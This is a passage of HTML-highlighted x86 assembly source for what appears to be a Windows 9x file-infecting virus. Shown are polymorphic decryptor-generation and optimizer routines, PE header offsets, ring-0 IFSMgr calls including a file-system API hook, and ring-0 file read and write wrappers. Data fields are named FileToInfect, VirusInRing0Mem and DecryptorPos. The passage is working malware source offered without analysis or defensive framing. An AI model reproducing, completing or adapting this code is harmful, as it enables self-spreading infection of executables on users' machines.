        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">Label32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FindValueLoop</span><span class="sc0">

      </span><span class="sc5">Label32</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OperandIsUndefined</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">ReturnPopEax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetWhereFrom</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">FromWhere</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GodDamnedLabelDammit</span><span class="sc0">
</span><span class="sc5">GetWhereTo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">EndWhere</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">GodDamnedLabelDammit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">GodDamnedLoopDammit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GodDamnedLoopDammit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OutputPrefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Prefix</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OutputPrefixEnd</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_db</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Prefix</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">OutputPrefixEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">










</span><span class="sc5">Optimize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClearDoNothingInstrucions</span><span class="sc0">
</span><span class="sc1">;       call    ClearUnnessesaryInstructions</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">MaybeUnnessesaryInstructions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_sub</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_and</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_or</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Op_xor</span><span class="sc0">
</span><span class="sc5">MaybeUnnessesaryInstructionsEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ClearUnnessesaryInstructions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

    </span><span class="sc5">ClearUnnessesaryInstructionsLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">MaybeUnnessesaryInstructions</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">MaybeUnnessesaryInstructionsEnd</span><span class="sc4">-</span><span class="sc5">MaybeUnnessesaryInstructions</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DontOptimize2</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc9">.while</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">al</span><span class="sc0">!</span><span class="sc4">=</span><span class="sc12">','</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        
      </span><span class="sc9">.endw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
      </span><span class="sc5">FindNextEntry</span><span class="sc4">:</span><span class="sc0">       
</span><span class="sc1">;        rep     scasb</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">DontOptimize2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DontOptimize2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Op_mov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FindNextEntry</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ClearUnnessesaryInstructionsLoop</span><span class="sc0">

   </span><span class="sc5">DontOptimize2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ClearUnnessesaryInstructionsLoop</span><span class="sc0">



        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">ClearDoNothingInstrucions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

     </span><span class="sc5">OptimizeLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OptimizeEnd</span><span class="sc0">

        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_mov</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DontOptimize</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DontOptimize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OptimizeLoop</span><span class="sc0">

     </span><span class="sc5">DontOptimize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OptimizeLoop</span><span class="sc0">

     </span><span class="sc5">OptimizeEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">OptimizeDoReallyQuit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OptimizeLoop</span><span class="sc0">


     </span><span class="sc5">OptimizeDoReallyQuit</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">







</span><span class="sc1">; 1. Init block                 </span><span class="sc0">

</span><span class="sc1">; offset 0                      </span><span class="sc0">
</span><span class="sc1">; pushad                        </span><span class="sc0">

</span><span class="sc1">; 2. Make pointer to mem</span><span class="sc0">

</span><span class="sc1">; 3. Read block</span><span class="sc0">
</span><span class="sc1">;    Encrypt block</span><span class="sc0">
</span><span class="sc1">;    Write block                </span><span class="sc0">

</span><span class="sc1">; popad</span><span class="sc0">

</span><span class="sc1">; 5. Change mempointer block</span><span class="sc0">
</span><span class="sc1">; 6. Compare and jump block</span><span class="sc0">

























































































































</span><span class="sc5">PE_Objects</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">PE_NTHdrSize</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">PE_Entrypoint</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">40</span><span class="sc0">
</span><span class="sc5">PE_ImageBase</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">52</span><span class="sc0">
</span><span class="sc5">PE_ObjectAlign</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">56</span><span class="sc0">
</span><span class="sc5">PE_FileAlign</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">60</span><span class="sc0">
</span><span class="sc5">PE_ImageSize</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80</span><span class="sc0">

</span><span class="sc5">Obj_Name</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Obj_VirtualSize</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Obj_VirtualOffset</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">Obj_PhysicalSize</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">Obj_PhysicalOffset</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">Obj_Flags</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">36</span><span class="sc0">        






</span><span class="sc5">IFSMgr</span><span class="sc0">                          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040h</span><span class="sc0">

</span><span class="sc5">R0_AllocMem</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000dh</span><span class="sc0">
</span><span class="sc5">R0_FreeMem</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000eh</span><span class="sc0">

</span><span class="sc5">Ring0_FileIO</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0032h</span><span class="sc0">
</span><span class="sc5">InstallFileSystemAPIhook</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0067h</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0041h</span><span class="sc0">

</span><span class="sc5">ResidentcodeStart</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FileFunction</span><span class="sc0">

</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">  </span><span class="sc1">; Open/Create a file</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D600h</span><span class="sc0">  </span><span class="sc1">; Read a file, no context</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">  </span><span class="sc1">; Write to a file, no context</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D700h</span><span class="sc0">


</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">33</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">36</span><span class="sc0"> 
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">


</span><span class="sc5">IFSFN_READ</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; read a file</span><span class="sc0">
</span><span class="sc5">IFSFN_WRITE</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; write a file</span><span class="sc0">



</span><span class="sc5">FileIOWrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Label6</span><span class="sc0">
        
</span><span class="sc5">FileIOReadDWordToSlack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; how many bytes</span><span class="sc0">
</span><span class="sc5">FileIOReadToSlack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Slack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; where to place data</span><span class="sc0">
</span><span class="sc5">FileIORead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
</span><span class="sc5">FileIOHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">FileHandle</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FileIO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Label6</span><span class="sc0">
</span><span class="sc5">vxd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Label6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CallService</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallService</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">20cdh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CallService</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CallService</span><span class="sc0">

</span><span class="sc5">CallService</span><span class="sc4">:</span><span class="sc0">        
</span><span class="sc5">Slack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">ZeroRegStart</span><span class="sc4">:</span><span class="sc0">


                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FileToInfect</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">TempPtr</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">TotalSize</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OldAPIFunction</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GuidePos</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GuideSize</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DecryptorPos</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DecryptorSize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">HeaderSize</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">VirusInRing0Mem</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">MemoryTable</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">VirtualDataSegment</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">ReturnAddr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ReturnAddr2</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">Flag</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">FileHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">PEHeadOfs</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">PEHeadStart</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ObjTable</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">CodeObjectPtr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DataObjectPtr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
